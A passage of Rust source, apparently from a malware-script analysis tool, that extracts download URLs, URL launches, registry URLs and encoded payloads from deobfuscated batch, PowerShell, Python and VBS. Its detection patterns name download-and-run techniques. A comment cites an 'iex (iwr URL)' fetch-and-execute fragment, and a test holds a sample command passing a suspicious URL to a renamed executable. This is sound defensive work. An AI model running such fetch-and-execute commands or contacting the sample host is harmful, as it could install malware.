                r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]"#
            ),
        )
        .expect("python string binding regex")
    });
    static PY_STRING_CONCAT_BINDING_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            &format!(
                r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*({PY_STRING_PREFIX_RE}['"][^'"]+['"](?:\s*(?:\+\s*)?{PY_STRING_PREFIX_RE}['"][^'"]+['"])*)"#
            ),
        )
        .expect("python string concat binding regex")
    });

    let mut bindings = std::collections::HashMap::new();
    for caps in PY_STRING_BINDING_RE.captures_iter(deobfuscated).take(64) {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(value) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        if !(32..=20_000).contains(&value.len()) || !is_python_base64_literal(value) {
            continue;
        }
        bindings.insert(name.to_string(), value.to_string());
    }
    for caps in PY_STRING_CONCAT_BINDING_RE
        .captures_iter(deobfuscated)
        .take(32)
    {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(expr) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(value) = collect_python_concat_string_literals(expr) else {
            continue;
        };
        if !(32..=20_000).contains(&value.len()) || !is_python_base64_literal(&value) {
            continue;
        }
        bindings.insert(name.to_string(), value);
    }
    bindings
}

fn collect_python_concat_string_literals(expr: &str) -> Option<String> {
    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
    static PY_STRING_LITERAL_PART_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(&format!(r#"(?is){PY_STRING_PREFIX_RE}['"]([^'"]+)['"]"#))
            .expect("python string literal part regex")
    });

    let mut out = String::new();
    let mut parts = 0usize;
    for caps in PY_STRING_LITERAL_PART_RE.captures_iter(expr).take(64) {
        let Some(value) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        out.push_str(value);
        parts += 1;
        if out.len() > 20_000 {
            return None;
        }
    }
    (parts >= 2).then_some(out)
}

fn is_python_identifier(s: &str) -> bool {
    let mut chars = s.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn decode_python_b64_payload(
    method: &str,
    b64: &str,
    has_urlsafe_altchars: bool,
    out: &mut Vec<String>,
    seen: &mut std::collections::HashSet<String>,
) {
    use base64::Engine;

    if !(32..=20_000).contains(&b64.len()) || !is_python_base64_literal(b64) {
        return;
    }
    if !seen.insert(b64.to_string()) {
        return;
    }
    let decoded = if method.eq_ignore_ascii_case("urlsafe_b64decode") || has_urlsafe_altchars {
        base64::engine::general_purpose::URL_SAFE
            .decode(b64)
            .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(b64))
    } else {
        base64::engine::general_purpose::STANDARD.decode(b64)
    };
    let Ok(decoded) = decoded else {
        return;
    };
    out.extend(decoded_python_literal_payloads(&decoded));
}

fn decoded_python_literal_payloads(decoded: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    if decoded.len() <= 64 * 1024 {
        if let Ok(text) = std::str::from_utf8(decoded) {
            out.push(text.to_string());
        }
    }
    if let Some(text) = inflate_python_literal_zlib(decoded) {
        out.push(text);
    }
    if let Some(text) = inflate_python_literal_gzip(decoded) {
        out.push(text);
    }
    out
}

fn inflate_python_literal_zlib(decoded: &[u8]) -> Option<String> {
    python_bounded_inflate(flate2::read::ZlibDecoder::new(decoded))
}

fn inflate_python_literal_gzip(decoded: &[u8]) -> Option<String> {
    python_bounded_inflate(flate2::read::GzDecoder::new(decoded))
}

fn python_bounded_inflate<R: std::io::Read>(reader: R) -> Option<String> {
    use std::io::Read as _;

    const MAX_DECOMPRESSED_BYTES: u64 = 64 * 1024;

    let mut limited = reader.take(MAX_DECOMPRESSED_BYTES + 1);
    let mut bytes = Vec::new();
    limited.read_to_end(&mut bytes).ok()?;
    if bytes.len() as u64 > MAX_DECOMPRESSED_BYTES {
        return None;
    }
    String::from_utf8(bytes).ok()
}

fn is_python_base64_literal(s: &str) -> bool {
    s.chars()
        .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '+' | '/' | '_' | '-' | '='))
}

fn python_b64_suffix_has_urlsafe_altchars(suffix: &str) -> bool {
    static PY_B64_ALTCHARS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)^\s*,\s*(?:altchars\s*=\s*)?(?:[bB])?['"]-_['"]\s*$"#)
            .expect("python b64 altchars regex")
    });

    PY_B64_ALTCHARS_RE.is_match(suffix)
}

fn emit_python_download(
    url: &str,
    deobfuscated: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    emit_python_download_with_dst(url, None, deobfuscated, env, known);
}

fn emit_python_download_with_dst(
    url: &str,
    dst: Option<&str>,
    deobfuscated: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    let url = trim_url_suffix(url);
    if is_noise_url(url) || !known.insert(url.to_string()) {
        return;
    }
    let line = deobfuscated.lines().find(|line| line.contains(url));
    let dst = dst
        .map(str::to_string)
        .or_else(|| line.and_then(|line| python_open_write_dst(line, url)));
    let line_hint = line
        .map(|line| snippet_prefix(line, 200))
        .unwrap_or_default();
    env.traits.push(Trait::Download {
        cmd: line_hint,
        src: url.to_string(),
        dst,
    });
}

fn scan_typo_webclient_downloads(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for (method, url, dst) in find_dotted_method_url_literals(deobfuscated) {
        if method.eq_ignore_ascii_case("de") {
            emit_typo_webclient_download(&url, dst, env, &mut known);
            continue;
        }
        if !is_likely_webclient_download_method(&method) {
            continue;
        }
        emit_typo_webclient_download(&url, dst, env, &mut known);
    }
}

fn find_call_url_literals(text: &str, names: &[&str]) -> Vec<String> {
    let mut found = Vec::new();
    for name in names {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive_from(text, name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(text, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let open = skip_ascii_ws(text, name_end);
            if text.as_bytes().get(open) != Some(&b'(') {
                search_start = name_end;
                continue;
            }
            let Some(close) = find_matching_paren(text, open) else {
                search_start = open + 1;
                continue;
            };
            if let Some(url) = first_url_literal(&text[open + 1..close]) {
                found.push(url);
            }
            search_start = close + 1;
        }
    }
    found
}

fn find_python_urlretrieve_literals(text: &str) -> Vec<(String, Option<String>)> {
    let mut found = Vec::new();
    let mut names = vec![
        "urllib.request.urlretrieve".to_string(),
        "urllib.urlretrieve".to_string(),
    ];
    names.extend(collect_python_urllib_call_aliases(text, "urlretrieve"));
    for name in names {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive_from(text, &name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(text, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let open = skip_ascii_ws(text, name_end);
            if text.as_bytes().get(open) != Some(&b'(') {
                search_start = name_end;
                continue;
            }
            let Some(close) = find_matching_paren(text, open) else {
                search_start = open + 1;
                continue;
            };
            let literals = quoted_string_literals(&text[open + 1..close]);
            if let Some((idx, url)) = literals
                .iter()
                .enumerate()
                .find(|(_, literal)| looks_like_direct_url(trim_url_suffix(literal)))
            {
                let dst = literals
                    .iter()
                    .skip(idx + 1)
                    .find(|literal| !looks_like_direct_url(trim_url_suffix(literal)))
                    .cloned();
                found.push((trim_url_suffix(url).to_string(), dst));
            }
            search_start = close + 1;
        }
    }
    found
}

fn collect_python_urllib_call_aliases(text: &str, target_method: &str) -> Vec<String> {
    static PY_FROM_URLLIB_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+urllib(?:\.request)?\s+import\s+([^;"'\r\n]+)"#)
            .expect("python urllib import regex")
    });
    static PY_IMPORT_URLLIB_REQUEST_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+urllib\.request\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python urllib.request import alias regex")
    });

    let mut aliases = Vec::new();
    for caps in PY_IMPORT_URLLIB_REQUEST_ALIAS_RE
        .captures_iter(text)
        .take(8)
    {
        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        aliases.push(format!("{alias}.{target_method}"));
    }
    for caps in PY_FROM_URLLIB_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words = part.split_ascii_whitespace().collect::<Vec<_>>();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if method != target_method {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.push(alias.to_string());
            }
        }
    }
    aliases
}

fn find_dotted_method_url_literals(text: &str) -> Vec<(String, String, Option<String>)> {
    let mut found = Vec::new();
    let mut cursor = 0;
    while let Some(dot_rel) = text[cursor..].find('.') {
        let dot = cursor + dot_rel;
        let method_start = dot + 1;
        let Some((method, method_end)) = parse_ascii_ident(text, method_start) else {
            cursor = method_start;
            continue;
        };
        let open = skip_ascii_ws(text, method_end);
        if text.as_bytes().get(open) != Some(&b'(') {
            cursor = method_end;
            continue;
        }
        let Some(close) = find_matching_paren(text, open) else {
            cursor = open + 1;
            continue;
        };
        let args = &text[open + 1..close];
        if let Some(url) = first_url_literal(args) {
            if !method.eq_ignore_ascii_case("de") || has_short_webclient_context(text, dot) {
                let dst = webclient_downloadfile_dst(&method, args, &url);
                found.push((method, url, dst));
            }
        }
        cursor = close + 1;
    }
    found
}

fn webclient_downloadfile_dst(method: &str, args: &str, url: &str) -> Option<String> {
    if !is_likely_webclient_downloadfile_method(method) {
        return None;
    }
    let literals = quoted_string_literals(args);
    let url_pos = literals.iter().position(|literal| {
        normalize_liberal_url_token(trim_url_suffix(literal)).as_deref() == Some(url)
    })?;
    literals
        .iter()
        .skip(url_pos + 1)
        .find(|literal| normalize_liberal_url_token(literal).is_none())
        .cloned()
}

fn is_callable_name_boundary(text: &str, start: usize, end: usize) -> bool {
    let prev_ok = start == 0
        || text
            .as_bytes()
            .get(start - 1)
            .map(|b| !b.is_ascii_alphanumeric() && *b != b'_' && *b != b'.')
            .unwrap_or(true);
    let next_ok = text
        .as_bytes()
        .get(end)
        .map(|b| !b.is_ascii_alphanumeric() && *b != b'_' && *b != b'.')
        .unwrap_or(true);
    prev_ok && next_ok
}

fn skip_ascii_ws(text: &str, mut idx: usize) -> usize {
    while let Some(byte) = text.as_bytes().get(idx) {
        if !byte.is_ascii_whitespace() {
            break;
        }
        idx += 1;
    }
    idx
}

fn parse_ascii_ident(text: &str, start: usize) -> Option<(String, usize)> {
    let bytes = text.as_bytes();
    let mut end = start;
    while let Some(byte) = bytes.get(end) {
        if !byte.is_ascii_alphabetic() {
            break;
        }
        end += 1;
    }
    (end > start).then(|| (text[start..end].to_string(), end))
}

fn find_matching_paren(text: &str, open: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut depth = 0usize;
    let mut quote: Option<u8> = None;
    let mut i = open;
    while i < bytes.len() {
        let byte = bytes[i];
        if let Some(q) = quote {
            if byte == b'\\' && bytes.get(i + 1) == Some(&q) {
                quote = None;
                i = i.saturating_add(2);
                continue;
            }
            if byte == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match byte {
            b'\\' if matches!(bytes.get(i + 1), Some(b'"' | b'\'')) => {
                quote = bytes.get(i + 1).copied();
                i += 1;
            }
            b'\'' | b'"' => quote = Some(byte),
            b'(' => depth += 1,
            b')' => {
                depth = depth.checked_sub(1)?;
                if depth == 0 {
                    return Some(i);
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

fn first_url_literal(args: &str) -> Option<String> {
    for literal in quoted_string_literals(args) {
        let literal = trim_url_suffix(&literal);
        if looks_like_direct_url(literal) {
            return Some(literal.to_string());
        }
    }
    None
}

fn python_open_write_dst(line: &str, url: &str) -> Option<String> {
    let mut search_start = 0;
    while let Some(open_start) = find_ascii_case_insensitive_from(line, "open", search_start) {
        let open_end = open_start + "open".len();
        if !is_callable_name_boundary(line, open_start, open_end) {
            search_start = open_end;
            continue;
        }
        let paren = skip_ascii_ws(line, open_end);
        if line.as_bytes().get(paren) != Some(&b'(') {
            search_start = open_end;
            continue;
        }
        let Some(close) = find_matching_paren(line, paren) else {
            search_start = paren + 1;
            continue;
        };
        let after = &line[close + 1..];
        if !after.contains(url) || !contains_ascii_case_insensitive(after, ".write") {
            search_start = close + 1;
            continue;
        }
        let literals = quoted_string_literals(&line[paren + 1..close]);
        let Some(dst) = literals.first() else {
            search_start = close + 1;
            continue;
        };
        let Some(mode) = literals.get(1) else {
            search_start = close + 1;
            continue;
        };
        if !looks_like_direct_url(dst)
            && mode
                .bytes()
                .any(|b| matches!(b.to_ascii_lowercase(), b'w' | b'a' | b'x'))
        {
            return Some(dst.clone());
        }
        search_start = close + 1;
    }
    None
}

fn quoted_string_literals(args: &str) -> Vec<String> {
    let bytes = args.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let mut quote = bytes[i];
        if quote == b'\\' && matches!(bytes.get(i + 1), Some(b'"' | b'\'')) {
            i += 1;
            quote = bytes[i];
        }
        if quote != b'"' && quote != b'\'' {
            i += 1;
            continue;
        }

        let tail = &args[i..];
        let tail_bytes = tail.as_bytes();
        let mut literal = String::new();
        let mut j = 1;
        while j < tail_bytes.len() {
            let byte = tail_bytes[j];
            if byte == b'\\' {
                if tail_bytes.get(j + 1) == Some(&quote) {
                    break;
                }
                if let Some(next) = tail_bytes.get(j + 1) {
                    if next.is_ascii() {
                        literal.push(*next as char);
                        j += 2;
                    } else if let Some(ch) = tail[j + 1..].chars().next() {
                        literal.push(ch);
                        j += 1 + ch.len_utf8();
                    } else {
                        j += 1;
                    }
                    continue;
                }
            }
            if byte == quote {
                break;
            }
            if byte.is_ascii() {
                literal.push(byte as char);
                j += 1;
            } else if let Some(ch) = tail[j..].chars().next() {
                literal.push(ch);
                j += ch.len_utf8();
            } else {
                break;
            }
        }
        out.push(literal);
        i += j + 1;
    }
    out
}

#[cfg(test)]
mod direct_url_literal_tests {
    use super::first_url_literal;

    #[test]
    fn quoted_unicode_url_literal_is_preserved() {
        assert_eq!(
            first_url_literal(r#""https://example.com/päth?q=1""#),
            Some("https://example.com/päth?q=1".to_string())
        );
    }
}

fn has_short_webclient_context(text: &str, dot: usize) -> bool {
    let window_start = dot.saturating_sub(32);
    contains_ascii_case_insensitive(&text[window_start..dot], "ebc")
}

fn emit_typo_webclient_download(
    url: &str,
    dst: Option<String>,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    let url = url.to_string();
    if is_noise_url(&url) || !known.insert(url.clone()) {
        return;
    }
    env.traits.push(Trait::Download {
        cmd: "powershell-webclient-typo".to_string(),
        src: url,
        dst,
    });
}

fn is_likely_webclient_download_method(method: &str) -> bool {
    if !method.is_ascii() {
        return false;
    }
    let normalized: Vec<u8> = method
        .bytes()
        .filter(|b| b.is_ascii_alphabetic())
        .map(|b| b.to_ascii_lowercase())
        .collect();
    if normalized.len() < 6 {
        return false;
    }

    ["downloadfile", "downloadstring"].iter().any(|target| {
        edit_distance_at_most_bytes(
            &normalized,
            target.as_bytes(),
            typo_method_distance_limit(normalized.len()),
        )
    })
}

fn is_likely_webclient_downloadfile_method(method: &str) -> bool {
    if !method.is_ascii() {
        return false;
    }
    let normalized: Vec<u8> = method
        .bytes()
        .filter(|b| b.is_ascii_alphabetic())
        .map(|b| b.to_ascii_lowercase())
        .collect();
    if normalized.len() < 6 {
        return false;
    }
    edit_distance_at_most_bytes(
        &normalized,
        b"downloadfile",
        typo_method_distance_limit(normalized.len()),
    )
}

#[cfg(test)]
mod webclient_typo_tests {
    use super::is_likely_webclient_download_method;

    #[test]
    fn mixed_case_ascii_method_still_matches() {
        assert!(is_likely_webclient_download_method("DoWnLoAdFiLe"));
        assert!(is_likely_webclient_download_method("dOwNlOaDsTrInG"));
        assert!(!is_likely_webclient_download_method("upload"));
    }

    #[test]
    fn non_ascii_method_is_not_classified_as_webclient_typo() {
        assert!(!is_likely_webclient_download_method("döwnloadfile"));
    }
}

fn typo_method_distance_limit(method_len: usize) -> usize {
    if method_len >= 10 {
        4
    } else {
        3
    }
}

fn edit_distance_at_most_bytes(left: &[u8], right: &[u8], max_distance: usize) -> bool {
    if left.len().abs_diff(right.len()) > max_distance {
        return false;
    }

    let mut prev: Vec<usize> = (0..=right.len()).collect();
    for (i, lc) in left.iter().enumerate() {
        let mut curr = vec![i + 1];
        let mut row_min = curr[0];
        for (j, rc) in right.iter().enumerate() {
            let substitution = usize::from(lc != rc);
            let cost = (prev[j + 1] + 1)
                .min(curr[j] + 1)
                .min(prev[j] + substitution);
            row_min = row_min.min(cost);
            curr.push(cost);
        }
        if row_min > max_distance {
            return false;
        }
        prev = curr;
    }
    prev[right.len()] <= max_distance
}

fn scan_url_launch_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        if tokens.is_empty() {
            continue;
        }

        for i in 0..tokens.len() {
            let cmd = command_name(strip_outer_quotes(&tokens[i]));
            let Some(url) =
                (if cmd.eq_ignore_ascii_case("start") || cmd.eq_ignore_ascii_case("start.exe") {
                    url_launch_after_start(&tokens, i + 1)
                } else if is_url_launcher_command(&cmd) {
                    first_url_after(&tokens, i + 1)
                } else {
                    None
                })
            else {
                continue;
            };

            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlLaunch {
                cmd: line.to_string(),
                url,
            });
        }
    }
}

fn scan_url_variable_assignments(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::RegistryUrl { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        for caps in CMD_URL_VAR_RE.captures_iter(line) {
            emit_url_variable(
                caps.get(1).map(|m| m.as_str()),
                caps.get(2).map(|m| m.as_str()),
                line,
                env,
                &mut known,
            );
        }
        for caps in PS_URL_VAR_RE.captures_iter(line) {
            emit_url_variable(
                caps.get(1).map(|m| m.as_str()),
                caps.get(2).map(|m| m.as_str()),
                line,
                env,
                &mut known,
            );
        }
    }
}

fn scan_registry_url_values(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::RegistryUrl { url, .. } => Some(url.clone()),
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        if tokens
            .first()
            .map(|token| !command_name(strip_outer_quotes(token)).eq_ignore_ascii_case("reg"))
            .unwrap_or(true)
            && !tokens
                .iter()
                .any(|token| command_name(strip_outer_quotes(token)).eq_ignore_ascii_case("reg"))
        {
            continue;
        }

        let mut value_name: Option<String> = None;
        let mut url: Option<String> = None;
        let mut i = 0;
        while i < tokens.len() {
            let token = strip_outer_quotes(&tokens[i]);
            if token.eq_ignore_ascii_case("/v") {
                value_name = tokens
                    .get(i + 1)
                    .map(|next| strip_outer_quotes(next).to_string());
                i += 2;
                continue;
            }
            if token.eq_ignore_ascii_case("/d") {
                url = tokens.get(i + 1).and_then(|next| {
                    normalize_liberal_url_token(trim_url_suffix(strip_outer_quotes(next)))
                });
                i += 2;
                continue;
            }
            i += 1;
        }
        let (Some(value), Some(url)) = (value_name, url) else {
            continue;
        };
        if is_noise_url(&url) || !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::RegistryUrl {
            cmd: line.to_string(),
            value,
            url,
        });
    }
}

fn emit_url_variable(
    name: Option<&str>,
    url: Option<&str>,
    line: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    let (Some(name), Some(url)) = (name, url) else {
        return;
    };
    let Some(url) = normalize_liberal_url_token(trim_url_suffix(url)) else {
        return;
    };
    if is_noise_url(&url) || !known.insert(url.clone()) {
        return;
    }
    env.traits.push(Trait::UrlVariable {
        name: name.to_string(),
        url,
        cmd: line.to_string(),
    });
}

pub(crate) fn trim_url_suffix(url: &str) -> &str {
    url.trim_end_matches(['"', '\'', ')', ']', '}', ';', ','])
}

fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::RegistryUrl { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        for caps in PROCESS_URL_ARG_RE.captures_iter(line) {
            let Some(url) = caps
                .get(1)
                .and_then(|m| normalize_liberal_url_token(trim_url_suffix(m.as_str())))
            else {
                continue;
            };
            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }

        let tokens = split_words(line);
        if tokens.len() < 2 {
            continue;
        }
        let cmd = command_name(strip_outer_quotes(&tokens[0]));
        if !is_url_argument_process(&cmd) || is_url_launcher_command(&cmd) {
            continue;
        }
        let Some(url) = first_url_after(&tokens, 1) else {
            continue;
        };
        if is_noise_url(&url) || !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::UrlArgument {
            cmd: line.to_string(),
            url,
        });
    }
}

fn url_launch_after_start(tokens: &[String], mut i: usize) -> Option<String> {
    let mut skipped_title = false;
    while i < tokens.len() {
        let token = strip_outer_quotes(&tokens[i]);
        if token.is_empty() {
            skipped_title = true;
            i += 1;
            continue;
        }
        if is_start_flag(token) {
            i += 1;
            continue;
        }
        if looks_like_direct_url(token) {
            let url = normalize_url_obfuscation(token);
            return normalize_liberal_url_token(&url);
        }
        if is_url_launcher_command(&command_name(token)) {
            return first_url_after(tokens, i + 1);
        }
        if !skipped_title
            && tokens
                .get(i + 1)
                .map(|next| looks_like_direct_url(strip_outer_quotes(next)))
                .unwrap_or(false)
        {
            skipped_title = true;
            i += 1;
            continue;
        }
        return None;
    }
    None
}

fn first_url_after(tokens: &[String], start: usize) -> Option<String> {
    tokens
        .iter()
        .skip(start)
        .map(|token| strip_outer_quotes(token).trim_matches(['(', ')', ';', ',', '"', '\'', '`']))
        .find(|token| looks_like_direct_url(token))
        // Truncate at shell/PS terminators that split.rs / split_words
        // didn't split on (e.g. `URL);Invoke-NullAMSI;function` in a
        // PS one-liner that has the URL embedded in a parenthesized
        // expression — `iex (iwr URL);next-stmt` etc.).
        .map(|token| {
            let end = token
                .find([')', '(', ';', ',', '"', '\'', '`'])
                .unwrap_or(token.len());
            let url = normalize_url_obfuscation(&token[..end]);
            normalize_liberal_url_token(&url).unwrap_or(url)
        })
}

/// Collapse common in-quote URL obfuscation tricks that survive into
/// our extracted URL string. Currently:
///   * `""` — empty double-quote pair inside `start "" "url""more""bits"`
///     is used to splinter scanners that key on the literal scheme/host
///     text. In CMD, `""` inside a quoted argument escapes to a literal
///     `"`, but the obfuscator's *intent* (and what ShellExecute/IE end
///     up dereferencing in practice on Windows since `"` is not a URL
///     char) is to make `""` evaporate. We collapse it so the IOC
///     output matches the analyst's mental model.
fn normalize_url_obfuscation(url: &str) -> String {
    if url.contains("\"\"") {
        url.replace("\"\"", "")
    } else {
        url.to_string()
    }
}

fn looks_like_direct_url(token: &str) -> bool {
    looks_like_liberal_url(token)
}

fn is_start_flag(token: &str) -> bool {
    [
        "/min",
        "/max",
        "/wait",
        "/low",
        "/normal",
        "/abovenormal",
        "/belownormal",
        "/high",
        "/realtime",
        "/b",
        "/i",
        "/w",
    ]
    .iter()
    .any(|flag| token.eq_ignore_ascii_case(flag))
}

#[cfg(test)]
mod start_flag_tests {
    use super::is_start_flag;

    #[test]
    fn mixed_case_start_flags_match() {
        assert!(is_start_flag("/MiN"));
        assert!(is_start_flag("/ReAlTiMe"));
        assert!(!is_start_flag("/foo"));
    }
}

#[cfg(test)]
mod url_argument_helper_tests {
    use super::{
        command_name, first_url_after, is_callable_name_boundary, is_url_argument_process,
    };
    use crate::handlers::util::split_words;

    #[test]
    fn trailing_dot_executable_path_is_recognized() {
        let tokens =
            split_words(r#"(C:\Users\Public\calc.COM. "https://skynetx.com.br/html.html")"#);
        let cmd = command_name(&tokens[0]);
        assert_eq!(cmd, "calc.COM");
        assert!(is_url_argument_process(&cmd));
        assert_eq!(
            first_url_after(&tokens, 1),
            Some("https://skynetx.com.br/html.html".to_string())
        );
    }

    #[test]
    fn bare_path_token_preserves_basename_case() {
        assert_eq!(command_name("C:\\Temp\\Foo.VbS."), "Foo.VbS".to_string());
    }

    #[test]
    fn callable_name_boundary_treats_unicode_as_separator() {
        assert!(is_callable_name_boundary("call(", 0, 4));
        assert!(is_callable_name_boundary("callα", 0, 4));
        assert!(!is_callable_name_boundary("xcall(", 1, 5));
        assert!(!is_callable_name_boundary("callx", 0, 4));
    }
}

fn is_url_launcher_command(cmd: &str) -> bool {
    [
        "explorer",
        "explorer.exe",
        "chrome",
        "chrome.exe",
        "msedge",
        "msedge.exe",
        "iexplore",
        "iexplore.exe",
        "firefox",
        "firefox.exe",
        "brave",
        "brave.exe",
        "opera",
        "opera.exe",
    ]
    .iter()
    .any(|launcher| cmd.eq_ignore_ascii_case(launcher))
}

fn is_url_argument_process(cmd: &str) -> bool {
    // Windows file extensions are case-insensitive — `Notepad.EXE`
    // / `payload.Bat` are valid invocations. Check suffixes in place
    // so we avoid allocating a lowercase copy.
    let cmd = cmd.trim_end_matches(['.', ' ']);
    ends_with_ascii_case_insensitive(cmd, ".exe")
        || ends_with_ascii_case_insensitive(cmd, ".com")
        || ends_with_ascii_case_insensitive(cmd, ".scr")
        || ends_with_ascii_case_insensitive(cmd, ".bat")
        || ends_with_ascii_case_insensitive(cmd, ".cmd")
}

fn command_name(token: &str) -> String {
    let token = token
        .trim_start_matches(|c: char| c == '@' || c == '(' || c.is_whitespace())
        .trim_end_matches([')', ',', ';'])
        .trim_end_matches(['.', ' ']);
    token
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(token)
        .to_string()
}

fn scan_echoed_vbs_xmlhttp_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !has_echoed_vbs_xmlhttp_shape(deobfuscated) {
        return;
    }

    let mut vbs = String::new();
    for line in deobfuscated.lines() {
        let trimmed = line.trim_start();
        let Some(rest) = trimmed
            .strip_prefix("echo ")
            .or_else(|| trimmed.strip_prefix("ECHO "))
        else {
            continue;
        };
        vbs.push_str(rest.trim_start());
        vbs.push_str("\r\n");
    }
    if vbs.is_empty() {
        return;
    }

    let mut payload_env = Environment::new(&crate::env::Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.all_extracted_vbs.push(vbs.into_bytes());
    crate::vbs_scan::scan_vbs_payloads(&mut payload_env);
    merge_traits_with_download_dedupe(env, payload_env.traits);
}

fn merge_traits_with_download_dedupe(env: &mut Environment, traits: Vec<Trait>) {
    let mut known_downloads: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();
    env.traits
        .extend(traits.into_iter().filter_map(|trait_| match &trait_ {
            Trait::Download { src, .. } if !known_downloads.insert(src.clone()) => None,
            _ => Some(trait_),
        }));
}

#[cfg(test)]
mod echoed_vbs_xmlhttp_prefilter_tests {
    use super::has_echoed_vbs_xmlhttp_shape;

